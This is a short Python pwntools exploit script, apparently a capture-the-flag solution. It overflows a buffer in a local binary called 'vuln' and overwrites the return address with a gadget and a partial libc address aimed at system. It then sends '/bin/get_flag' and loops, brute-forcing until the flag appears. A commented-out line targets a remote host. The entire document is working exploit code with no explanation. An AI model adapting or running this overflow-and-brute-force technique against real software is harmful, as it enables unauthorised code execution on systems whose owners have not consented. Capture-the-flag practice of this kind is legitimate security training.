#!/usr/bin/python3

from pwn import *

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky2"
    port = 13708


i = 0

while True:
    proc=process('../materials/vuln')
    #proc=remote(host,port)
    proc.write(35*p64(0x00) + p64(0x401483) + 2*p64(0x00) + b"\x30\xc3\x04") #Offset System in 2.31: 0x45e50    #Offset local: 0x4c330
    proc.write("/bin/get_flag\x00")
    sleep(0.1)
    res = proc.read(timeout=1).decode()
    sleep(0.1)

    try:
        res2 = proc.read(timeout=1).decode()
        res += res2
    except Exception as err:
        print(Exception, err)
        proc.kill()
        proc.close()

    print(res)
    if 'flag' in res:
        print(res)
        break
    print(hex(i))
    i = i + 1



